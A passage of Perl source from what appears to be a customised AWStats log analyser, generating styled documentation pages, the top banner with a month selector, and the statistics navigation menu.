	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--warning-color:#b91c1c;--note-bg:#fef3c7;--note-border:#f59e0b}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--warning-color:#f87171;--note-bg:#4b3d1a;--note-border:#fbbf24}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.step{margin:25px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.step h3{margin-top:0;color:var(--link-color)}.migration-notes{margin:30px 0;padding:20px;background-color:var(--note-bg);border:1px solid var(--note-border);border-radius:8px}.migration-notes h2{color:var(--note-border);border-bottom-color:var(--note-border)}.note-item{margin:15px 0;padding:15px;background-color:var(--bg-color);border:1px solid var(--border-color);border-radius:6px}.note-item u{color:var(--note-border);font-weight:bold}.note{font-style:italic;color:var(--link-color);padding:10px;background-color:var(--header-bg);border-left:4px solid var(--link-color);border-radius:4px}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:5px 0}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:monospace}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	<div class="section">
		$content
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}
#------------------------------------------------------------------------------
# 生成 webmin 文档页面
# Parameters: $dir (webmin目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_webmin_doc {
	my ($dir) = @_;
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.webmin.title");
	my $subtitle = _t("docs.webmin.subtitle");
	my $content = _t("docs.webmin.content");
	$content =~ s/\\n/\n/g;
	my $full_title = "$doc_title - $page_title";
	
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--section-border:#9999cc;--result-bg:#e6f3ff;--config-bg:#fef3c7}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--section-border:#6677aa;--result-bg:#1e3a5f;--config-bg:#4b3d1a}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.webmin-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.webmin-section h2{margin-top:0;color:var(--section-border);border-bottom-color:var(--section-border)}.config-details{margin:20px 0;padding:15px;background-color:var(--config-bg);border:1px solid var(--border-color);border-radius:6px}.config-details h4{margin:15px 0 5px;color:var(--link-color)}.config-details h4:first-child{margin-top:0}.result{margin:15px 0;padding:10px;background-color:var(--result-bg);border-left:4px solid var(--link-color);border-radius:4px;font-style:italic}.section-nav{background-color:var(--header-bg);padding:15px;border-radius:8px;border:1px solid var(--border-color);margin:20px 0}.section-nav li{margin:8px 0}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:8px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:monospace;font-size:0.95em}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	<div class="section">
		$content
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}
#------------------------------------------------------------------------------
# 生成首页内容页面
# Parameters: $dir (首页介绍)
# Return: None
#------------------------------------------------------------------------------
sub generate_home_doc {
	my ($dir) = @_;
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.home.title");
	my $subtitle = _t("docs.home.subtitle");
	my $content = _t("docs.home.content");
	$content =~ s/\\n/\n/g;
	my $full_title = "$doc_title - $page_title";
	
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--primary-color:#3b82f6;--primary-hover:#2563eb;--secondary-color:#8b5cf6;--accent-color:#10b981;--card-bg:#ffffff;--hero-bg:linear-gradient(135deg,#667eea 0%,#764ba2 100%);--hero-text:#ffffff;--new-badge:#ef4444;--improved-badge:#f59e0b}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--primary-color:#3b82f6;--primary-hover:#60a5fa;--secondary-color:#a78bfa;--accent-color:#34d399;--card-bg:#2d3748;--hero-bg:linear-gradient(135deg,#434190 0%,#553c9a 100%);--hero-text:#f3f4f6;--new-badge:#f87171;--improved-badge:#fbbf24}body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;line-height:1.6;margin:0;padding:0;background-color:var(--bg-color);color:var(--text-color)}.home-content{max-width:1200px;margin:0 auto;padding:0 20px}h1,h2,h3{color:var(--text-color)}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.hero-section{background:var(--hero-bg);color:var(--hero-text);border-radius:24px;padding:60px 40px;margin:40px 0;display:flex;align-items:center;gap:40px}.hero-content{flex:1}.hero-title{font-size:3em;margin:0 0 20px;color:white}.hero-description{font-size:1.2em;margin-bottom:30px;opacity:0.95}.hero-stats{font-size:1.1em;margin-bottom:30px;opacity:0.9}.stat-number{font-weight:bold;font-size:1.3em}.hero-buttons{display:flex;gap:15px}.button{display:inline-block;padding:12px 30px;border-radius:30px;font-weight:600;transition:all 0.3s ease}.button-primary{background:white;color:#4c51bf}.button-primary:hover{background:#f0f0f0;transform:translateY(-2px);text-decoration:none}.button-secondary{background:transparent;color:white;border:2px solid white}.button-secondary:hover{background:rgba(255,255,255,0.1);transform:translateY(-2px);text-decoration:none}.button-large{padding:15px 40px;font-size:1.1em}.button-text{padding:0;color:var(--link-color);background:none}.hero-image{flex:1;text-align:center}.dashboard-preview{max-width:100%;border-radius:12px;box-shadow:0 20px 40px rgba(0,0,0,0.2)}.section-title{font-size:2.5em;text-align:center;margin:60px 0 20px}.section-subtitle{text-align:center;font-size:1.2em;color:var(--text-color);opacity:0.8;margin-bottom:40px}.features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;margin:40px 0}.feature-card{background:var(--card-bg);border:1px solid var(--border-color);border-radius:16px;padding:30px;transition:all 0.3s ease}.feature-card:hover{transform:translateY(-5px);box-shadow:0 10px 30px rgba(0,0,0,0.1)}.feature-icon{font-size:3em;margin-bottom:20px}.feature-card h3{margin:0 0 15px;font-size:1.3em}.feature-card p{margin:0;color:var(--text-color);opacity:0.9}.whatsnew-section{background:var(--header-bg);border:1px solid var(--border-color);border-radius:24px;padding:40px;margin:60px 0;position:relative}.whatsnew-badge{position:absolute;top:-15px;left:40px;background:var(--new-badge);color:white;padding:5px 20px;border-radius:30px;font-weight:bold;font-size:1em}.version-date{text-align:center;color:var(--text-color);opacity:0.7;margin-top:-10px}.whatsnew-desc{font-size:1.2em;text-align:center;margin:20px 0 30px}.whatsnew-list{list-style:none;padding:0;margin:0;display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:15px}.whatsnew-list li{padding:15px;background:var(--bg-color);border:1px solid var(--border-color);border-radius:12px;line-height:1.5}.new-badge{background:var(--new-badge);color:white;padding:2px 8px;border-radius:12px;font-size:0.8em;font-weight:bold;margin-right:8px;display:inline-block}.improved-badge{background:var(--improved-badge);color:white;padding:2px 8px;border-radius:12px;font-size:0.8em;font-weight:bold;margin-right:8px;display:inline-block}.whatsnew-footer{text-align:center;margin-top:30px}.technical-section{margin:60px 0}.technical-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:20px;margin:40px 0}.technical-item{display:flex;align-items:flex-start;gap:15px;padding:20px;background:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.technical-check{font-size:1.5em}.technical-text{flex:1}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;margin:40px 0}.stat-card{text-align:center;padding:30px;background:var(--card-bg);border:1px solid var(--border-color);border-radius:16px}.stat-icon{font-size:3em;margin-bottom:20px}.stat-card h3{margin:0 0 15px}.cta-section{background:linear-gradient(135deg,var(--primary-color) 0%,var(--secondary-color) 100%);color:white;border-radius:24px;padding:60px;text-align:center;margin:60px 0}.cta-title{font-size:2.5em;margin:0 0 20px;color:white}.cta-desc{font-size:1.2em;margin-bottom:30px;opacity:0.95}.cta-buttons{display:flex;gap:20px;justify-content:center}.home-footer{text-align:center;padding:40px 0;border-top:1px solid var(--border-color);margin-top:40px}.footer-links{margin-top:10px}.footer-links a{color:var(--text-color);opacity:0.8}.footer-links a:hover{opacity:1}\@media (max-width:768px){.hero-section{flex-direction:column;padding:40px 20px}.hero-title{font-size:2em}.whatsnew-list{grid-template-columns:1fr}.cta-section{padding:40px 20px}.cta-buttons{flex-direction:column}}
	</style>
	<div class="home-content">
		$content
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# Function:     Prints the top banner of the inner frame or static page
# Parameters:   $WIDTHMENU1
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLTopBanner{
	my $WIDTHMENU1 = shift;
	my $frame = ( $FrameName eq 'mainleft' );
	my $title =  "👁️ " . _t("AWStats Log Viewer");
	
	if ($Debug) { debug( "ShowTopBan", 2 ); }
	print "$Center<a name=\"menu\">&nbsp;</a>";

	if ( $FrameName ne 'mainleft' ) {
		my $NewLinkParams = ${QueryString};
		$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		my $NewLinkTarget = '';

		if ( $FrameName eq 'mainright' ) {
			$NewLinkTarget = " target=\"_parent\"";
		}
	}
	my $logo_path = "$DirData/logo.svg";
	my $show_branding = (-f $logo_path && -r $logo_path);

	# 显示时使用 StatsUrl（Web路径）
	my $logo_web = "$StatsUrl/logo.svg";
	if ( $QueryString !~ /buildpdf/i ) {
		print "<table class=\"aws_border\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";

		if ($show_branding) {
			my $margin_style = ($PageDir == 1) ? 'margin-right: 8px;' : 'margin-left: 8px;';
			my $platform = $BrandPlatform || '';
			my $brand_title = sprintf(_t("%s Server Management Panel"), $platform);
			if ($platform) {
				$brand_title = sprintf($brand_title, $platform);
			}
			
			print "<tr>";
			print "<td colspan=\"2\" style=\"padding: 8px 15px; background-color: var(--header-bg, #f1f5f9); border-bottom: 1px solid var(--border-color, #e5e7eb);\">\n";
			print "<div style=\"display: flex; align-items: center; gap: 15px; flex-wrap: wrap;\">\n";
			print "<a href=\"$BrandLink\" target=\"_blank\" style=\"text-decoration: none; flex-shrink: 0;\">\n";
			print "<img src=\"$logo_web\" alt=\"Logo\" style=\"height: 40px; width: auto;\" onerror=\"this.style.display='none'\">\n";
			print "</a>";
			print "<div style=\"display: flex; flex-wrap: wrap; align-items: baseline; gap: 8px; row-gap: 5px;\">\n";
			print "<span style=\"font-size: 18px; font-weight: bold; white-space: nowrap;\">$brand_title</span>\n";
			print "<span style=\"font-size: 16px; color: #9c1759; $margin_style\">" . _t("Server Administration") . "</span>\n";
			print "</div>\n";
			print "</div>\n";
			print "</td>\n";
			print "</tr>\n";
		}

		print "<tr><td class=\"aws-title\" width=\"78%\">$title</td>\n";
		print "<td class=\"aws-whitespace\">&nbsp;</td>\n";
		print "</tr>\n";
		print "<tr><td colspan=\"2\">\n";
		print "<table class=\"aws_data\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
	}
	else {
		print "<table width=\"100%\">\n";
	}

	print "<tr valign=\"middle\">\n";
	print "<td class=\"aws\" valign=\"middle\" width=\"$WIDTHMENU1\"><b>"
	. _t("Current site")
	. ":</b>&nbsp;</td>\n";
	print "<td class=\"aws\" valign=\"middle\" colspan=\"5\"><span style=\"font-size: 14px;\">$SiteDomain</span></td>\n";
	print "</tr>\n";

	if ( $FrameName ne 'mainleft' ) {
		print "<tr valign=\"middle\">\n";
		print "<td class=\"aws\" valign=\"middle\" width=\"$WIDTHMENU1\"><b>"
		  . _t("Last Update")
		  . ":</b>&nbsp;</td>\n";
		print "<td class=\"aws\" valign=\"middle\" colspan=\"5\"><span style=\"font-size: 12px;\">";
		
		if ($LastUpdate) { 
			print Format_Date( $LastUpdate, 0 ); 
		}
		else {
			if ( !$UpdateStats ) {
				print "<span style=\"color: #880000\">" . _t("Never updated") . "</span>";
			}
			else {
				print "<span style=\"color: #880000\">"
				  . _t("No qualified records found in log")
				  . " ($NbOfLinesCorrupted "
				  . _t("corrupted") . ", $NbOfLinesComment "
				  . _t("comments") . ", $NbOfLinesBlank "
				  . _t("Blank") . ", $NbOfLinesDropped "
				  . _t("dropped") . ")</span>";
			}
		}
		print "</span>";

		# Print Update Now link
		if ( $AllowToUpdateStatsFromBrowser && !$StaticLinks ) {
			my $NewLinkParams = ${QueryString};
			$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
			$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
			$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
			if ( $FrameName eq 'mainright' ) {
				$NewLinkParams .= "&amp;framename=mainright";
			}
			$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
			$NewLinkParams =~ s/^&amp;//;
			$NewLinkParams =~ s/&amp;$//;
			if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
			print "&nbsp; &nbsp; &nbsp; &nbsp;";
			print "<a href=\""
			  . XMLEncode("$AWScript${NewLinkParams}update=1")
			  . "\">" . _t("Update now") . "</a>";
		}
		print "</td>\n";
		
		if ( $FrameName eq 'mainright' ) {
			if ( $LogoLink =~ "https://www.awstats.org" ) {
				print "<td align=\"right\" rowspan=\"2\"><a href=\""
				. XMLEncode($LogoLink)
				. "\" target=\"awstatshome\"><img src=\"$DirIcons/os/$Logo\" border=\"0\" width=\"260\" height=\"90\""
				. AltTitle( ucfirst($PROG) . " " . _t("Web Site") )
				. " onerror=\"this.style.display='none'\" /></a>";
			}
			else {
				print "<td align=\"right\" rowspan=\"2\"><a href=\""
				. XMLEncode($LogoLink)
				. "\" target=\"awstatshome\"><img src=\"$DirIcons/os/$Logo\" border=\"0\" width=\"260\" height=\"90\" onerror=\"this.style.display='none'\" /></a>";
			}
			if ( !$StaticLinks ) { print "<br>"; Show_Flag_Links($Lang); }
			print "</td>\n";
		}
		print "</tr>\n";
	}

	if ( $FrameName ne 'mainleft' ) {
		print "<tr valign=\"middle\">\n";
		print "<td class=\"aws\" valign=\"middle\"><b>" . _t("Month Selection") . ":</b></td>\n";
		print "<td class=\"aws\" valign=\"middle\" colspan=\"5\">\n";

		if ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks ) {
			my @available_months = get_available_months_from_datafiles();
			
			if (@available_months) {
				print "<form name=\"period\" action=\"$AWScript\" method=\"get\" style=\"display: inline;\">\n";
				print "<select name=\"month_selector\" onchange=\"changeMonth()\" class=\"aws_formfield\">\n";
				
				my $current_month_key = "$YearRequired-$MonthRequired";
				my $has_current = 0;
				
				my $max_month = 12;
				if (defined &GetMaxMonth_localdate) {
					$max_month = GetMaxMonth_localdate($Lang);
				}
				
				foreach my $month_key (@available_months) {
					my ($year, $mon) = split('-', $month_key);
					next if $mon > $max_month;
					
					my $display = sprintf(_t("date_format_month"), $MonthNumLib{$mon}, $year);
					my $selected = ($month_key eq $current_month_key) ? 'selected' : '';
					$has_current = 1 if $selected;
					print "<option value=\"$month_key\" $selected>$display</option>\n";
				}
				
				# 处理第13个月（埃塞俄比亚历和希伯来历闰年）
				if ($max_month == 13) {
					my $calendar_type = get_calendar_type($Lang);
					my $month_13_name = "";
					my $month_13_key = "$YearRequired-13";
					
					if ($calendar_type eq 'ethiopian') {
						$month_13_name = _t("month_13") || "Pagumē";
					} 
					elsif ($calendar_type eq 'hebrew' && is_hebrew_leap_year(convert_hebrew($YearRequired, 1, 1))) {
						$month_13_name = _t("month_13") || "Adar I";
					}
					
					if ($month_13_name) {
						my $selected = ($month_13_key eq $current_month_key) ? 'selected' : '';
						$has_current = 1 if $selected;
						print "<option value=\"$month_13_key\" $selected>$month_13_name $YearRequired</option>\n";
					}
				}
				
				if (!$has_current && $MonthRequired ne 'all') {
					my $current_display = sprintf(_t("date_format_month"), $MonthNumLib{$MonthRequired}, $YearRequired);
					print "<option value=\"$YearRequired-$MonthRequired\" selected>$current_display (" . _t("No data") . ")</option>\n";
				}
				
				print "</select>\n";
				print "</form>\n";
				print "<input type=\"hidden\" name=\"output\" value=\""
				  . join( ',', keys %HTMLOutput )
				  . "\">\n";
				if ($SiteConfig) {
					print "<input type=\"hidden\" name=\"config\" value=\"$SiteConfig\">\n";
				}
				if ($DirConfig) {
					print "<input type=\"hidden\" name=\"configdir\" value=\"$DirConfig\">\n";
				}
				if ( $QueryString =~ /lang=(\w+)/i ) {
					print "<input type=\"hidden\" name=\"lang\" value=\"$1\">\n";
				}
				if ( $QueryString =~ /debug=(\d+)/i ) {
					print "<input type=\"hidden\" name=\"debug\" value=\"$1\">\n";
				}
				if ( $FrameName eq 'mainright' ) {
					print "<input type=\"hidden\" name=\"framename\" value=\"index\">\n";
				}
			} else {
				print "<span style=\"color: #880000;\">" . _t("No data available") . "</span>\n";
			}
		} else {
			print "<span style=\"font-size: 14px;\">";
			if ( $MonthRequired eq 'all' ) {
				my $year_display = $YearRequired;
				if (defined &FormatYear_localdate) {
					$year_display = FormatYear_localdate($YearRequired, $Lang);
				} else {
					$year_display = _t("Year") . " $YearRequired";
				}
				print $year_display;
			} else {
				my $month_display;
				if (defined &FormatMonth_localdate) {
					$month_display = FormatMonth_localdate($MonthRequired, $YearRequired, $Lang);
				} else {
					$month_display = sprintf(_t("date_format_month"), $MonthNumLib{$MonthRequired}, $YearRequired);
				}
				print $month_display;
			}
			print "</span>";
		}
		print "</td>\n";
		print "</tr>\n";
	}

	if ( $QueryString !~ /buildpdf/i ) {
		print "</table>\n";
		print "</td>\n";
		print "</tr>\n";
		print "</table>\n";
	}
	else {
		print "</table>\n";
	}

	# 输出额外换行
	if ( $FrameName ne 'mainleft' ) { print "<br>\n"; }
	else { print "<br>\n"; }
	print "\n";

	my $menu_NewLinkParams = ${QueryString};
	$menu_NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
	$menu_NewLinkParams =~ s/(^|&|&amp;)output(=\w*|$)//i;
	$menu_NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
	$menu_NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	$menu_NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$menu_NewLinkParams =~ s/^&amp;//;
	$menu_NewLinkParams =~ s/&amp;$//;
	if ($menu_NewLinkParams) { $menu_NewLinkParams = "${menu_NewLinkParams}&amp;"; }
	
	my $menu_NewLinkTarget = '';
	if ( $FrameName eq 'mainright' ) {
		$menu_NewLinkTarget = " target=\"_parent\"";
	}
	
	if ( $ShowMenu || $FrameName eq 'mainleft' ) {
		HTMLMenu($menu_NewLinkParams, $menu_NewLinkTarget);
	}
	# 输出 JavaScript
	print_month_selector_js();
}

#------------------------------------------------------------------------------
# Function:     Get available months from existing data files
# Return:       Array of months in "YYYY-MM" format, sorted newest first
#------------------------------------------------------------------------------
sub get_available_months_from_datafiles {
	my @months = ();
	my $data_dir = $DirData || '.';
	
	opendir(my $dh, $data_dir) or return @months;
	while (my $file = readdir($dh)) {
		if ($file =~ /awstats(\d{2})(\d{4})/) {
			my $mon = $1;
			my $year = $2;
			if ($mon >= 1 && $mon <= 12) {
				push @months, "$year-$mon";
			}
		}
	}
	closedir($dh);
	
	my %seen;
	my @unique = grep { !$seen{$_}++ } @months;
	@unique = sort { $b cmp $a } @unique;
	
	return @unique;
}

#------------------------------------------------------------------------------
# Function:     Print JavaScript for month selector
#------------------------------------------------------------------------------
sub print_month_selector_js {
	print <<'END_JS';
<script>
function changeMonth() {
	var selector = document.querySelector('select[name="month_selector"]');
	if (!selector) return;
	
	var monthValue = selector.value;
	var parts = monthValue.split('-');
	var year = parts[0];
	var month = parts[1];
	var url = new URL(window.location.href);
	url.searchParams.set('year', year);
	url.searchParams.set('month', month);
	window.location.href = url.toString();
}
</script>
END_JS
}

#------------------------------------------------------------------------------
# Function:     Prints the menu in a frame or below the top banner
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMenu{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	my $frame = ( $FrameName eq 'mainleft' );

	if ($Debug) { debug( "ShowMenu", 2 ); }

	# Print menu links
	if ( $HTMLOutput{'main'} && ( $FrameName eq 'mainleft' || $FrameName eq 'mainright' ) )
	{    
		# If main page asked
		# Define link anchor
		my $linkanchor =
		  ( $FrameName eq 'mainleft' ? "$AWScript${NewLinkParams}" : "" );
		if ( $linkanchor && ( $linkanchor !~ /framename=mainright/ ) ) {
			$linkanchor .= "framename=mainright";
		}
		$linkanchor =~ s/(&|&amp;)$//;
		$linkanchor = XMLEncode("$linkanchor");

		# Define target
		my $targetpage =
		  ( $FrameName eq 'mainleft' ? " target=\"mainright\"" : "" );

		# Print Menu
		my $linetitle;    # TODO a virer
		if ( !$PluginsLoaded{'ShowMenu'}{'menuapplet'} ) {
			my $menuicon = 0;    # TODO a virer
			
			if ( $FrameName eq 'mainright' ) {
				print "<table class=\"aws_border\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
				print "<tr><td colspan=\"2\">";
				print "<table class=\"aws_data\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
			}
			
			# Menu HTML
			if ( $FrameName eq 'mainleft' && $ShowMonthStats ) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#top\"$targetpage>" . _t("Top") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			my %menu     = ();
			my %menulink = ();
			my %menutext = ();

			# When
			%menu = (
				'month'       => $ShowMonthStats       ? 1 : 0,
				'daysofmonth' => $ShowDaysOfMonthStats ? 2 : 0,
				'daysofweek'  => $ShowDaysOfWeekStats  ? 3 : 0,
				'hours'       => $ShowHoursStats       ? 4 : 0
			);
			%menulink = (
				'month'       => 1,
				'daysofmonth' => 1,
				'daysofweek'  => 1,
				'hours'       => 1
			);
			%menutext = (
				'month'       => _t("Month"),
				'daysofmonth' => _t("Day"),
				'daysofweek'  => _t("Day of week"),
				'hours'       => _t("Hours")
			);
			HTMLShowMenuCateg(
				'when',         _t("When"),
				'menu4.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);

			# Who
			%menu = (
				'countries'  => $ShowDomainsStats ? 1 : 0,
				'alldomains' => $ShowDomainsStats ? 2 : 0,
				'visitors'   => $ShowHostsStats   ? 3 : 0,
				'allhosts'   => $ShowHostsStats   ? 4 : 0,
				'lasthosts' => ( $ShowHostsStats =~ /L/i ) ? 5 : 0,
				'unknownip' => $ShowHostsStats ? 6 : 0,
				'logins'    => $ShowAuthenticatedUsers ? 7 : 0,
				'alllogins' => $ShowAuthenticatedUsers ? 8 : 0,
				'lastlogins' => ( $ShowAuthenticatedUsers =~ /L/i ) ? 9 : 0,
				'emailsenders' => $ShowEMailSenders ? 10 : 0,
				'allemails'    => $ShowEMailSenders ? 11 : 0,
				'lastemails' => ( $ShowEMailSenders =~ /L/i ) ? 12 : 0,
				'emailreceivers' => $ShowEMailReceivers ? 13 : 0,
				'allemailr'      => $ShowEMailReceivers ? 14 : 0,
				'lastemailr'     => ( $ShowEMailReceivers =~ /L/i ) ? 15 : 0,
				'robots'    => $ShowRobotsStats ? 16 : 0,
				'allrobots' => $ShowRobotsStats ? 17 : 0,
				'lastrobots' => ( $ShowRobotsStats =~ /L/i ) ? 18 : 0,
				'worms' => $ShowWormsStats ? 19 : 0
			);
			%menulink = (
				'countries'      => 1,
				'alldomains'     => 2,
				'visitors'       => 1,
				'allhosts'       => 2,
				'lasthosts'      => 2,
				'unknownip'      => 2,
				'logins'         => 1,
				'alllogins'      => 2,
				'lastlogins'     => 2,
				'emailsenders'   => 1,
				'allemails'      => 2,
				'lastemails'     => 2,
				'emailreceivers' => 1,
				'allemailr'      => 2,
				'lastemailr'     => 2,
				'robots'         => 1,
				'allrobots'      => 2,
				'lastrobots'     => 2,
				'worms'          => 1
			);
			%menutext = (
				'countries'      => _t("Countries"),
				'alldomains'     => _t("Full list"),
				'visitors'       => _t("Visitors"),
				'allhosts'       => _t("Full list"),
				'lasthosts'      => _t("Last"),
				'unknownip'      => _t("Unresolved IP Address"),
				'logins'         => _t("Login"),
				'alllogins'      => _t("Full list"),
				'lastlogins'     => _t("Last"),
				'emailsenders'   => _t("Email Senders"),
				'allemails'      => _t("Full list"),
				'lastemails'     => _t("Last"),
				'emailreceivers' => _t("Email Receivers"),
				'allemailr'      => _t("Full list"),
				'lastemailr'     => _t("Last"),
				'robots'         => _t("Robots"),
				'allrobots'      => _t("Full list"),
				'lastrobots'     => _t("Last"),
				'worms'          => _t("Worms")
			);
			HTMLShowMenuCateg(
				'who',          _t("Who"),
				'menu5.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);

			# Navigation
			$linetitle = &AtLeastOneNotNull(
				$ShowSessionsStats,  $ShowPagesStats,
				$ShowFileTypesStats, $ShowFileSizesStats,
				$ShowOSStats,        $ShowBrowsersStats,
				$ShowScreenSizeStats, $ShowDownloadsStats,
				$ShowDeviceTypesStats
			);
			if ($linetitle) {
				print "<tr><td class=\"awsm\""
				  . ( $frame ? "" : " valign=\"top\"" ) . ">"
				  . "<b>" . _t("Navigation") . ":</b></td>\n";
			}
			if ($linetitle) {
				print( $frame? "</tr>\n" : "<td class=\"awsm\">" );
			}
			if ($ShowSessionsStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#sessions\"$targetpage>" . _t("Visits duration") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowDeviceTypesStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#devices\"$targetpage>" . _t("Device Types") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowFileSizesStats) {
					print ( $frame? "<tr><td class=\"awsm\">" : "" );
					print "<a href=\"$linkanchor#filesizes\"$targetpage>" . _t("File size") . "</a>";
					print ( $frame? "</td>\n</tr>\n" : " &nbsp; ");
			}
			if ($ShowRequestTimesStats) {
					print( $frame? "<tr><td class=\"awsm\">" : "" );
					print "<a href=\"$linkanchor#requesttimes\"$targetpage>" . _t("Request time") . "</a>";
					print ($frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowFileTypesStats && $LevelForFileTypesDetection > 0) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#filetypes\"$targetpage>" . _t("File type") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowDownloadsStats && $LevelForFileTypesDetection > 0) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print "<a href=\"$linkanchor#downloads\"$targetpage>" . _t("Downloads") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=downloads")
					: "$StaticLinks.downloads.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
				print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
			}
			if ($ShowPagesStats) {
